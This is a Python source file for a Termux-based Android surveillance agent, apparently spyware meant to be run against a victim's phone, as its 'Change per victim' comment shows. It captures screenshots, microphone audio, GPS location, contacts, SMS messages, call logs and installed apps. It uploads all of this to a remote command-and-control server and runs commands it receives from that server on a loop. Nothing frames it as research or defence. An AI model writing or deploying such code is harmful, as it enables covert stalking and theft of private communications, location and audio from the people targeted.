import requests
import time
import os
import json
import subprocess
from datetime import datetime
import threading

class TermuxAgent:
    def __init__(self, agent_id, platform_url):
        self.agent_id = agent_id
        self.platform_url = platform_url
        self.running = True
        
    def install_dependencies(self):
        """Install required Termux packages"""
        print("📦 Installing dependencies...")
        packages = [
            "termux-api",  # For device access
            "python", 
            "ffmpeg",      # For media processing
            "termux-tools"
        ]
        
        for pkg in packages:
            try:
                subprocess.run(["pkg", "install", "-y", pkg], 
                             check=True, capture_output=True)
                print(f"✅ Installed: {pkg}")
            except:
                print(f"⚠️  {pkg} already installed")
    
    def get_device_info(self):
        """Get comprehensive device information"""
        info = {
            'agent_id': self.agent_id,
            'phone_model': self.get_phone_model(),
            'android_version': self.get_android_version(),
            'battery_level': self.get_battery_level(),
            'storage_info': self.get_storage_info(),
            'network_info': self.get_network_info(),
            'installed_apps': self.get_installed_apps()[:10]  # First 10 apps
        }
        return info
    
    def get_phone_model(self):
        try:
            result = subprocess.run(["getprop", "ro.product.model"], 
                                  capture_output=True, text=True)
            return result.stdout.strip() or "Unknown Android"
        except:
            return "Unknown Android"
    
    def get_android_version(self):
        try:
            result = subprocess.run(["getprop", "ro.build.version.release"], 
                                  capture_output=True, text=True)
            return f"Android {result.stdout.strip()}"
        except:
            return "Android Unknown"
    
    def get_battery_level(self):
        try:
            # Requires termux-api
            result = subprocess.run(["termux-battery-status"], 
                                  capture_output=True, text=True)
            battery_data = json.loads(result.stdout)
            return battery_data.get('percentage', 50)
        except:
            return 50
    
    def get_storage_info(self):
        try:
            result = subprocess.run(["df", "/data"], capture_output=True, text=True)
            return result.stdout.strip().split('\n')[-1] if result.stdout else "Unknown"
        except:
            return "Unknown"
    
    def get_network_info(self):
        try:
            result = subprocess.run(["termux-wifi-connectioninfo"], 
                                  capture_output=True, text=True)
            return json.loads(result.stdout) if result.stdout else {"ssid": "Unknown"}
        except:
            return {"ssid": "Unknown"}
    
    def get_installed_apps(self):
        try:
            result = subprocess.run(["pm", "list", "packages"], 
                                  capture_output=True, text=True)
            return [pkg.replace('package:', '') for pkg in result.stdout.strip().split('\n')]
        except:
            return []
    
    def capture_screenshot(self):
        """Capture actual screenshot (requires termux-api)"""
        try:
            timestamp = int(time.time())
            filename = f"/sdcard/screenshot_{self.agent_id}_{timestamp}.png"
            
            # Capture screenshot
            subprocess.run(["termux-screenshot", "-f", filename], 
                         capture_output=True, timeout=10)
            
            # Read and return file data
            if os.path.exists(filename):
                with open(filename, 'rb') as f:
                    screenshot_data = f.read()
                os.remove(filename)  # Clean up
                return screenshot_data
        except Exception as e:
            print(f"📸 Screenshot failed: {e}")
        
        return None
    
    def record_audio(self, duration=10):
        """Record audio from microphone"""
        try:
            timestamp = int(time.time())
            filename = f"/sdcard/recording_{self.agent_id}_{timestamp}.mp3"
            
            # Record audio
            subprocess.run([
                "termux-microphone-record", 
                "-f", filename,
                "-l", str(duration)
            ], capture_output=True, timeout=duration + 5)
            
            if os.path.exists(filename):
                with open(filename, 'rb') as f:
                    audio_data = f.read()
                os.remove(filename)  # Clean up
                return audio_data
        except Exception as e:
            print(f"🎤 Audio recording failed: {e}")
        
        return None
    
    def get_location(self):
        """Get device location"""
        try:
            result = subprocess.run(["termux-location"], 
                                  capture_output=True, text=True, timeout=30)
            location_data = json.loads(result.stdout)
            return {
                'latitude': location_data.get('latitude'),
                'longitude': location_data.get('longitude'),
                'accuracy': location_data.get('accuracy')
            }
        except Exception as e:
            print(f"📍 Location failed: {e}")
            return None
    
    def get_contacts(self):
        """Get device contacts"""
        try:
            result = subprocess.run(["termux-contact-list"], 
                                  capture_output=True, text=True)
            contacts = json.loads(result.stdout)
            return contacts[:50]  # First 50 contacts
        except:
            return []
    
    def get_sms_messages(self, limit=20):
        """Get recent SMS messages"""
        try:
            result = subprocess.run(["termux-sms-list", "-l", str(limit)], 
                                  capture_output=True, text=True)
            messages = json.loads(result.stdout)
            return messages
        except:
            return []
    
    def get_call_logs(self, limit=20):
        """Get recent call logs"""
        try:
            result = subprocess.run(["termux-call-log", "-l", str(limit)], 
                                  capture_output=True, text=True)
            call_logs = json.loads(result.stdout)
            return call_logs
        except:
            return []
    
    def register_with_platform(self):
        """Register with the surveillance platform"""
        try:
            device_info = self.get_device_info()
            
            response = requests.post(
                f"{self.platform_url}/api/agent/register",
                json=device_info,
                headers={'Content-Type': 'application/json'},
                timeout=10
            )
            
            if response.status_code == 200:
                print("✅ Registered with surveillance platform")
                return True
            return False
        except Exception as e:
            print(f"❌ Registration failed: {e}")
            return False
    
    def upload_screenshot_to_platform(self):
        """Upload screenshot to platform"""
        try:
            screenshot_data = self.capture_screenshot()
            if screenshot_data:
                files = {'screenshot': ('screen.png', screenshot_data, 'image/png')}
                data = {'agent_id': self.agent_id}
                
                response = requests.post(
                    f"{self.platform_url}/api/agent/upload_screenshot",
                    files=files,
                    data=data,
                    timeout=30
                )
                return response.status_code == 200
        except Exception as e:
            print(f"📸 Upload failed: {e}")
        return False
    
    def upload_audio_to_platform(self):
        """Upload audio recording to platform"""
        try:
            audio_data = self.record_audio(duration=15)
            if audio_data:
                files = {'audio': ('recording.mp3', audio_data, 'audio/mpeg')}
                data = {
                    'agent_id': self.agent_id,
                    'call_type': 'microphone_recording',
                    'phone_number': 'microphone',
                    'duration': 15
                }
                
                response = requests.post(
                    f"{self.platform_url}/api/agent/upload_call",
                    files=files,
                    data=data,
                    timeout=30
                )
                return response.status_code == 200
        except Exception as e:
            print(f"🎤 Audio upload failed: {e}")
        return False
    
    def upload_contacts_to_platform(self):
        """Upload contacts to platform"""
        try:
            contacts = self.get_contacts()
            response = requests.post(
                f"{self.platform_url}/api/agent/web_data",
                json={
                    'agent_id': self.agent_id,
                    'data_type': 'contacts',
                    'data_content': json.dumps(contacts)
                },
                timeout=10
            )
            return response.status_code == 200
        except Exception as e:
            print(f"📒 Contacts upload failed: {e}")
        return False
    
    def upload_sms_to_platform(self):
        """Upload SMS messages to platform"""
        try:
            sms_messages = self.get_sms_messages(limit=15)
            response = requests.post(
                f"{self.platform_url}/api/agent/web_data",
                json={
                    'agent_id': self.agent_id,
                    'data_type': 'sms_messages',
                    'data_content': json.dumps(sms_messages)
                },
                timeout=10
            )
            return response.status_code == 200
        except Exception as e:
            print(f"💬 SMS upload failed: {e}")
        return False
    
    def upload_call_logs_to_platform(self):
        """Upload call logs to platform"""
        try:
            call_logs = self.get_call_logs(limit=15)
            response = requests.post(
                f"{self.platform_url}/api/agent/web_data",
                json={
                    'agent_id': self.agent_id,
                    'data_type': 'call_logs',
                    'data_content': json.dumps(call_logs)
                },
                timeout=10
            )
            return response.status_code == 200
        except Exception as e:
            print(f"📞 Call logs upload failed: {e}")
        return False
    
    def upload_location_to_platform(self):
        """Upload location to platform"""
        try:
            location = self.get_location()
            if location:
                response = requests.post(
                    f"{self.platform_url}/api/agent/web_data",
                    json={
                        'agent_id': self.agent_id,
                        'data_type': 'gps_location',
                        'data_content': json.dumps(location)
                    },
                    timeout=10
                )
                return response.status_code == 200
        except Exception as e:
            print(f"📍 Location upload failed: {e}")
        return False
    
    def check_commands(self):
        """Check for commands from platform"""
        try:
            response = requests.get(
                f"{self.platform_url}/api/agent/check_commands/{self.agent_id}",
                timeout=10
            )
            
            if response.status_code == 200:
                commands = response.json().get('commands', [])
                
                for cmd in commands:
                    print(f"🎯 Executing command: {cmd['command']}")
                    self.execute_command(cmd)
                
                return len(commands)
            return 0
        except Exception as e:
            print(f"🎯 Command check failed: {e}")
            return 0
    
    def execute_command(self, command_data):
        """Execute command from platform"""
        command = command_data['command']
        
        try:
            if command == 'capture_screenshot':
                self.upload_screenshot_to_platform()
            elif command == 'record_audio':
                self.upload_audio_to_platform()
            elif command == 'get_location':
                self.upload_location_to_platform()
            elif command == 'get_contacts':
                self.upload_contacts_to_platform()
            elif command == 'get_sms':
                self.upload_sms_to_platform()
            elif command == 'get_call_logs':
                self.upload_call_logs_to_platform()
            elif command == 'get_device_info':
                self.register_with_platform()
            
            # Mark command as completed
            requests.post(
                f"{self.platform_url}/api/agent/command_result",
                json={
                    'command_id': command_data['id'],
                    'result': f'Executed: {command}'
                }
            )
            
        except Exception as e:
            print(f"💥 Command execution failed: {e}")
    
    def update_status(self):
        """Send status update to platform"""
        try:
            status_data = {
                'agent_id': self.agent_id,
                'battery_level': self.get_battery_level(),
                'location': 'Termux Agent Active'
            }
            
            requests.post(
                f"{self.platform_url}/api/agent/update_status",
                json=status_data,
                timeout=10
            )
            print("🔋 Status updated")
        except Exception as e:
            print(f"🔋 Status update failed: {e}")
    
    def start_surveillance(self):
        """Start the surveillance system"""
        print("🎯 TERMUX SURVEILLANCE AGENT STARTING...")
        print("=" * 50)
        print(f"🆔 Agent ID: {self.agent_id}")
        print(f"🌐 Platform: {self.platform_url}")
        print("=" * 50)
        
        # Install dependencies
        self.install_dependencies()
        
        # Initial registration
        if not self.register_with_platform():
            print("❌ Initial registration failed")
            return
        
        cycle = 0
        while self.running:
            try:
                cycle += 1
                print(f"\n🔄 Surveillance Cycle #{cycle}")
                print("-" * 40)
                
                # Check for commands
                command_count = self.check_commands()
                if command_count > 0:
                    print(f"📡 Executed {command_count} commands")
                
                # Regular surveillance activities
                if cycle % 3 == 0:  # Every 3 cycles
                    self.upload_screenshot_to_platform()
                
                if cycle % 5 == 0:  # Every 5 cycles
                    self.upload_audio_to_platform()
                
                if cycle % 4 == 0:  # Every 4 cycles
                    self.upload_location_to_platform()
                
                if cycle % 10 == 0:  # Every 10 cycles
                    self.upload_contacts_to_platform()
                    self.upload_sms_to_platform()
                    self.upload_call_logs_to_platform()
                
                # Always update status
                self.update_status()
                
                # Re-register every 15 cycles
                if cycle % 15 == 0:
                    self.register_with_platform()
                
                print(f"✅ Cycle #{cycle} completed")
                print("⏰ Next cycle in 60 seconds...")
                time.sleep(60)
                
            except KeyboardInterrupt:
                print("\n🛑 Surveillance stopped by user")
                break
            except Exception as e:
                print(f"💥 Surveillance error: {e}")
                print("🔄 Retrying in 120 seconds...")
                time.sleep(120)

# Main execution
if __name__ == "__main__":
    # Configuration
    PLATFORM_URL = "https://mp-agent.onrender.com"  # Your platform
    AGENT_ID = "termux_agent_001"  # Change per victim
    
    agent = TermuxAgent(AGENT_ID, PLATFORM_URL)
    agent.start_surveillance()